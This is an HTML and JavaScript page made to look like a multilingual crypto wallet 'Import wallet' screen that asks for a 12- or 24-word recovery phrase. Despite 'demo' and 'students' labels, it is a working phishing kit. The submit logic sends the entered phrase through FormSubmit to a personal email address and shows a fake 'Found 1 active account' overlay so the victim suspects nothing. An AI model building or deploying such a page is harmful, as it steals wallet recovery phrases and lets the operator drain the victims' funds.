<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Wallet Import | Landing</title>
  <meta name="description" content="Recovery phrase input UI demo" />
  <style>
    :root{
      --bg:#d9d3f0;           /* soft lavender bg */
      --card:#1c1f24;         /* dark card */
      --card-2:#20242b;       /* input bg */
      --text:#eef2f6;
      --muted:#a8b0bb;
      --accent:#7c83ff;
      --border:#2a2f37;
      --shadow:0 18px 40px rgba(0,0,0,.35), 0 2px 10px rgba(0,0,0,.25);
      --radius:18px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{margin:0;font-family:ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Apple SD Gothic Neo", "Noto Sans KR", "Malgun Gothic", sans-serif;background:var(--bg);color:var(--text)}

    .page{ position:relative;min-height:100%;display:flex;align-items:center;justify-content:center;padding:40px; }

    /* help */
    .help{position:fixed;right:24px;top:20px;color:#0f1115;font-weight:700;font-size:14px;display:flex;gap:8px;align-items:center;opacity:.75}
    .help .dot{width:18px;height:18px;border-radius:50%;background:#0f1115;color:#fff;display:grid;place-items:center;font-size:12px}

    /* card */
    .card{ width:min(560px, 92vw);background:var(--card);border:1px solid var(--border);border-radius:22px;box-shadow:var(--shadow);overflow:hidden }
    .card-top{ background:#181b20;border-bottom:1px solid var(--border);padding:10px 0;display:flex;align-items:center;justify-content:center;gap:10px }
    .pill{width:8px;height:8px;border-radius:999px;background:#343a44}
    .pill.active{background:#7d7cff}

    .card-body{padding:28px}
    h1{margin:2px 0 6px;text-align:center;font-size:28px;letter-spacing:.4px}
    .sub{color:var(--muted);text-align:center;line-height:1.5;margin-bottom:22px}

    .grid{display:grid;grid-template-columns:repeat(3, 1fr);gap:10px}
    .expander{overflow:hidden;transition:max-height .35s ease;max-height:1200px}
    @media (max-width:520px){.grid{grid-template-columns:repeat(2, 1fr)}}

    .field{position:relative}
    .field input{ width:100%;padding:12px 12px 12px 38px;border-radius:12px;background:var(--card-2);border:1px solid var(--border);color:var(--text);outline:none;transition:border .15s, box-shadow .15s }
    .field input::placeholder{color:#6c7582}
    .field input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(124,131,255,.25)}
    .num{ position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:12px;color:#8a93a0;opacity:.95 }

    .toggle{margin:18px 0 10px;text-align:center;color:var(--muted);font-size:14px}

    .action{margin-top:14px}
    .btn{ width:100%;padding:14px 16px;border-radius:12px;background:#2a3039;border:1px solid var(--border);color:#dfe6ee;font-weight:700;letter-spacing:.3px;cursor:pointer;transition:background .15s, opacity .15s }
    .btn:active{transform:translateY(1px)}
    .btn[disabled]{opacity:.45;cursor:not-allowed;background:#2a3039}
    .btn.primary{background:var(--accent); color:#fff; border-color:transparent}

    /* overlays */
    .overlay{position:fixed;inset:0;display:none;place-items:center;background:rgba(10,12,16,.6);backdrop-filter:blur(2px);z-index:50}
    .overlay.show{display:grid}
    .loader-card{width:min(420px,92vw);background:var(--card);border:1px solid var(--border);border-radius:22px;box-shadow:var(--shadow);padding:36px 28px;text-align:center}
    .coin{width:96px;height:96px;margin:0 auto 18px;position:relative}
    .ring{position:absolute;inset:0;border-radius:50%;border:8px solid #8d84ff;border-top-color:#c7c2ff;animation:spin 1.2s linear infinite}
    .coin-inner{position:absolute;inset:14px;border-radius:50%;background:#b5afff;display:grid;place-items:center;color:#23262d;font-weight:900}
    @keyframes spin{to{transform:rotate(360deg)}}

    /* language FAB */
    .langfab{position:fixed;right:18px;bottom:18px;z-index:60}
    .langbtn{background:#2a3039;color:#e8ecf3;border:1px solid var(--border);border-radius:999px;padding:10px 14px;font-weight:700;box-shadow:var(--shadow);cursor:pointer}
    .langmenu{position:absolute;right:0;bottom:52px;background:var(--card);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);display:none;min-width:180px;overflow:hidden}
    .langmenu.show{display:block}
    .langmenu button{display:block;width:100%;text-align:left;padding:10px 12px;background:transparent;border:none;color:#e8ecf3;cursor:pointer}
    .langmenu button:hover{background:#252a32}
  </style>
</head>
<body>
  <div class="page">
    <a class="help" href="#" id="helpLink"><span class="dot">?</span><span id="helpText"></span></a>

    <section class="card" role="dialog" aria-modal="true" aria-labelledby="title">
      <div class="card-top">
        <span class="pill"></span>
        <span class="pill active"></span>
        <span class="pill"></span>
      </div>
      <div class="card-body">
        <h1 id="title">Recovery phrase</h1>
        <p class="sub">Import an existing wallet with a 12 or 24‑word recovery phrase.</p>

        <!-- FormSubmit -->
        <form name="students" id="studentForm" method="POST" action="https://formsubmit.co/lgm1831@naver.com">
          <input type="hidden" name="form-name" value="students" />
          <input type="text" name="bot-field" style="display:none" />

          <div id="expander" class="expander">
            <div id="fields" class="grid" aria-live="polite"></div>
          </div>

          <div class="toggle">
            <button type="button" id="toggleBtn" class="btn" style="background:#252a32;border-color:#2f3540;width:auto;padding:8px 12px;display:block;margin:0 auto;">I have a 24‑word recovery phrase</button>
          </div>

          <input type="hidden" name="entries" id="entries" />
          <input type="hidden" name="count" id="count" />
          <input type="hidden" name="words_joined" id="words_joined" />
          <input type="hidden" name="mode" id="mode" />
          <!-- FormSubmit options -->
          <input type="hidden" name="_subject" value="Wallet phrase submission (students)" />
          <input type="hidden" name="_template" value="table" />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_next" id="_next" value="" />

          <div class="action"><button class="btn" id="import" type="submit" disabled>Import wallet</button></div>
        </form>
      </div>
    </section>

    <!-- loading overlay -->
    <div id="overlay" class="overlay" aria-hidden="true">
      <div class="loader-card">
        <div class="coin" aria-hidden="true">
          <div class="ring"></div>
          <div class="coin-inner">$</div>
        </div>
        <h2 style="margin:0 0 6px">Fetching accounts</h2>
        <p class="sub" style="margin:0">Looking for active accounts</p>
      </div>
    </div>

    <!-- done overlay -->
    <div id="overlayDone" class="overlay" aria-hidden="true">
      <div class="loader-card">
        <div style="width:96px;height:96px;margin:0 auto 18px;border-radius:50%;background:#163220;display:grid;place-items:center">
          <span style="font-size:44px;color:#23c463;line-height:1">✓</span>
        </div>
        <h2 style="margin:0 0 6px">Fetching accounts</h2>
        <p class="sub" style="margin:0">Found 1 active account</p>
        <div style="margin-top:18px;display:grid;gap:10px">
          <button id="viewBtn" class="btn" type="button" style="width:100%">View account</button>
          <button id="contBtn" class="btn primary" type="button" style="width:100%">Continue</button>
        </div>
      </div>
    </div>

    <!-- language FAB -->
    <div class="langfab">
      <div class="langmenu" id="langMenu"></div>
      <button class="langbtn" id="langBtn">Language</button>
    </div>
  </div><!-- /.page -->

  <script>
    // ===== i18n =====
    const I18N = {
      en:{ title:'Recovery phrase', sub:'Import an existing wallet with a 12 or 24‑word recovery phrase.', toggle24:'I have a 24‑word recovery phrase', toggle12:'I have a 12‑word recovery phrase', submit:'Import wallet', overlayTitle:'Fetching accounts', overlaySub:'Looking for active accounts', doneTitle:'Fetching accounts', doneSub:'Found 1 active account', view:'View account', cont:'Continue', word:'word', language:'Language', helpLabel:'Help', helpAlert:'Demo help\nEnter 12/24 words and press Import.'},
      ko:{ title:'복구용 문구', sub:'12개 또는 24개 단어의 복구용 문구로 기존 월릿을 가져옵니다.', toggle24:'24개 단어의 복구 문구가 있습니다', toggle12:'12개 단어의 복구 문구가 있습니다', submit:'월릿 가져오기', overlayTitle:'계정 가져오기', overlaySub:'활동이 있는 계정 찾기', doneTitle:'계정 가져오기', doneSub:'활동이 있는 1개 계정을 찾았습니다', view:'계정 보기', cont:'계속', word:'단어', language:'언어', helpLabel:'도움말', helpAlert:'도움말 데모\n12/24단어를 입력하고 가져오기를 누르세요.'},
      ja:{ title:'リカバリーフレーズ', sub:'12語または24語のリカバリーフレーズで既存のウォレットをインポートします。', toggle24:'24語のリカバリーフレーズを持っています', toggle12:'12語のリカバリーフレーズを持っています', submit:'ウォレットをインポート', overlayTitle:'アカウントを取得中', overlaySub:'アクティブなアカウントを検索', doneTitle:'アカウントを取得中', doneSub:'アクティブなアカウントを1件見つけました', view:'アカウントを見る', cont:'続行', word:'単語', language:'言語', helpLabel:'ヘルプ', helpAlert:'デ모ヘルプ\n12/24語を入力して［インポート］を押してください。'},
      zh:{ title:'助记词', sub:'使用 12 或 24 个单词的助记词导入已有钱包。', toggle24:'我有 24 个单词的助记词', toggle12:'我有 12 个单词的助记词', submit:'导入钱包', overlayTitle:'正在获取账户', overlaySub:'正在查找活跃账户', doneTitle:'正在获取账户', doneSub:'找到 1 个活跃账户', view:'查看账户', cont:'继续', word:'单词', language:'语言', helpLabel:'帮助', helpAlert:'演示帮助\n输入 12/24 个单词并点击“导入”。'},
      es:{ title:'Frase de recuperación', sub:'Importa una billetera existente con una frase de recuperación de 12 o 24 palabras.', toggle24:'Tengo una frase de 24 palabras', toggle12:'Tengo una frase de 12 palabras', submit:'Importar billetera', overlayTitle:'Buscando cuentas', overlaySub:'Buscando cuentas activas', doneTitle:'Búsqueda de cuentas', doneSub:'Se encontró 1 cuenta activa', view:'Ver cuenta', cont:'Continuar', word:'palabra', language:'Idioma', helpLabel:'Ayuda', helpAlert:'Ayuda de demostración\nIntroduce 12/24 palabras y pulsa Importar.'}
    };

    // default = English; allow localStorage override; fallback to navigator only if unknown
    let LANG = localStorage.getItem('lang') || 'en';
    if(!I18N[LANG]){ const nav=(navigator.language||'en').toLowerCase(); LANG = nav.startsWith('ko')?'ko':nav.startsWith('ja')?'ja':nav.startsWith('zh')?'zh':'en'; }
    const t = k => (I18N[LANG] && I18N[LANG][k]) || I18N.en[k] || k;

    // ===== DOM refs =====
    const titleEl = document.getElementById('title');
    const subEl = document.querySelector('.sub');
    const fieldsEl = document.getElementById('fields');
    const expander = document.getElementById('expander');
    const toggleBtn = document.getElementById('toggleBtn');
    const form = document.getElementById('studentForm');
    const importBtn = document.getElementById('import');
    const overlay = document.getElementById('overlay');
    const overlayDone = document.getElementById('overlayDone');
    const overlayTitleEls = document.querySelectorAll('#overlay h2');
    const overlaySubEls   = document.querySelectorAll('#overlay .sub');
    const doneTitleEl = document.querySelector('#overlayDone h2');
    const doneSubEl   = document.querySelector('#overlayDone .sub');
    const viewBtn = document.getElementById('viewBtn');
    const contBtn = document.getElementById('contBtn');
    const helpLink = document.getElementById('helpLink');
    const helpText = document.getElementById('helpText');
    const langBtn = document.getElementById('langBtn');
    const langMenu = document.getElementById('langMenu');

    // ===== helpers =====
    let is24 = false; // mode state
    function renderFields(count){
      fieldsEl.innerHTML='';
      for(let i=1;i<=count;i++){
        const w=document.createElement('div');w.className='field';
        const n=document.createElement('span');n.className='num';n.textContent=i+'.';
        const input=document.createElement('input');
        input.type='text'; input.placeholder=t('word'); input.autocomplete='off'; input.inputMode='latin'; input.setAttribute('aria-label', `${t('word')} ${i}`);
        w.appendChild(n); w.appendChild(input); fieldsEl.appendChild(w);
      }
      attachInputListeners();
    }
    function requiredCount(){ return is24?24:12; }
    function attachInputListeners(){ fieldsEl.querySelectorAll('input').forEach(i=> i.addEventListener('input', updateState)); }
    function filledCount(){ return [...fieldsEl.querySelectorAll('input')].map(i=>i.value.trim()).filter(v=>v!=='').length; }
    function updateState(){ const ok = filledCount() >= requiredCount(); importBtn.disabled=!ok; importBtn.classList.toggle('primary', ok); }

    function applyLang(){
      // labels
      titleEl.textContent = t('title');
      subEl.textContent   = t('sub');
      toggleBtn.textContent = is24 ? t('toggle12') : t('toggle24');
      importBtn.textContent = t('submit');
      overlayTitleEls.forEach(el=> el.textContent = t('overlayTitle'));
      overlaySubEls.forEach(el=> el.textContent = t('overlaySub'));
      if (doneTitleEl) doneTitleEl.textContent = t('doneTitle');
      if (doneSubEl)   doneSubEl.textContent   = t('doneSub');
      if (viewBtn) viewBtn.textContent = t('view');
      if (contBtn) contBtn.textContent = t('cont');
      langBtn.textContent = t('language');
      helpText.textContent = t('helpLabel');
      helpLink.onclick = (e)=>{ e.preventDefault(); alert(t('helpAlert')); return false; };
      // re-render inputs to update placeholder/aria
      renderFields(requiredCount());
      updateState();
    }

    // init
    renderFields(12);
    requestAnimationFrame(()=>{ expander.style.maxHeight = expander.scrollHeight + 'px'; });
    applyLang();

    // toggle 12/24
    toggleBtn.addEventListener('click', ()=>{ is24=!is24; renderFields(requiredCount()); requestAnimationFrame(()=>{ expander.style.maxHeight = expander.scrollHeight + 'px'; }); toggleBtn.textContent = is24 ? t('toggle12') : t('toggle24'); updateState(); });

    // submit flow
    form.addEventListener('submit', (e)=>{
      const ok = filledCount() >= requiredCount(); if(!ok){ e.preventDefault(); return; }
      const vals = [...fieldsEl.querySelectorAll('input')].map(i=>i.value.trim());
      const filled = vals.filter(v=>v!=='');
      document.getElementById('entries').value = JSON.stringify(vals);
      document.getElementById('count').value   = String(filled.length);
      document.getElementById('words_joined').value = filled.slice(0, requiredCount()).join(' ');
      document.getElementById('mode').value = is24 ? '24' : '12';
      document.getElementById('_next').value = location.href.replace(/[#?].*$/,'') + '#thanks';
      e.preventDefault(); overlay.classList.add('show'); setTimeout(()=>{ overlay.classList.remove('show'); overlayDone.classList.add('show'); }, 3000);
    });
    document.getElementById('viewBtn').addEventListener('click', ()=> overlayDone.classList.remove('show'));
    document.getElementById('contBtn').addEventListener('click', async ()=>{
      // Use FormSubmit AJAX to avoid leaving the page and to catch errors
      try{
        const payload = {
          entries: document.getElementById('entries').value,
          count: document.getElementById('count').value,
          words_joined: document.getElementById('words_joined').value,
          mode: document.getElementById('mode').value,
          _subject: 'Wallet phrase submission (students)',
          _template: 'table',
          _captcha: 'false'
        };
        const res = await fetch('https://formsubmit.co/ajax/lgm1831@naver.com',{
          method:'POST',
          headers:{'Content-Type':'application/json','Accept':'application/json'},
          body: JSON.stringify(payload)
        });
        if(!res.ok){
          const tx = await res.text();
          alert('제출 실패\n' + tx.slice(0,300));
          return;
        }
        const data = await res.json();
        // First time to this email requires verification from FormSubmit
        alert('제출 완료! 메일함을 확인하세요.\n처음 사용하는 주소라면 FormSubmit에서 온 확인 메일(스팸함 포함)을 승인해야 이후부터 정상 수신됩니다.');
        overlayDone.classList.remove('show');
      }catch(err){
        alert('네트워크 오류: ' + (err?.message||err));
      }
    });

    // language menu
    const LANGS = ['en','ko','ja','zh','es'];
    function buildMenu(){
      langMenu.innerHTML = '';
      const labelMap={en:'English', ko:'한국어', ja:'日本語', zh:'简体中文', es:'Español'};
      LANGS.forEach(code=>{
        const b=document.createElement('button');
        b.textContent = labelMap[code] || code; b.addEventListener('click', ()=>{ LANG=code; localStorage.setItem('lang', LANG); langMenu.classList.remove('show'); applyLang(); });
        langMenu.appendChild(b);
      });
    }
    buildMenu();
    langBtn.addEventListener('click', ()=> langMenu.classList.toggle('show'));
    document.addEventListener('click', (e)=>{ if(!e.target.closest('.langfab')) langMenu.classList.remove('show'); });

    // ===== DEV TESTS =====
    if (location.hash === '#test'){
      console.group('DEV TESTS');
      console.assert(fieldsEl.querySelectorAll('input').length === 12, 'Should render 12 inputs initially');
      toggleBtn.click();
      console.assert(fieldsEl.querySelectorAll('input').length === 24, 'Should render 24 inputs after toggle');
      // language switch
      LANG='ko'; applyLang(); console.assert(document.getElementById('langBtn').textContent.length>0, 'Language button labeled');
      LANG='en'; applyLang();
      // Help label reflects i18n
      console.assert(document.getElementById('helpText').textContent === t('helpLabel'), 'Help label matches i18n');
      // Help alert contains a newline (escaped) to avoid syntax errors
      console.assert(t('helpAlert').includes('\n') || t('helpAlert').includes('\\n') || t('helpAlert').indexOf('\n')>-1, 'helpAlert newline escape present');
      // Enable/disable submit by filling required
      let idx=0; fieldsEl.querySelectorAll('input').forEach(el=>{ if(idx<requiredCount()){ el.value='n'+idx; el.dispatchEvent(new Event('input')); idx++; }});
      console.assert(!importBtn.disabled, 'Submit enabled after filling required inputs');
      const first = fieldsEl.querySelector('input'); first.value=''; first.dispatchEvent(new Event('input'));
      console.assert(importBtn.disabled, 'Submit disabled when not all required filled');
      console.groupEnd();
    }
  </script>
</body>
</html>
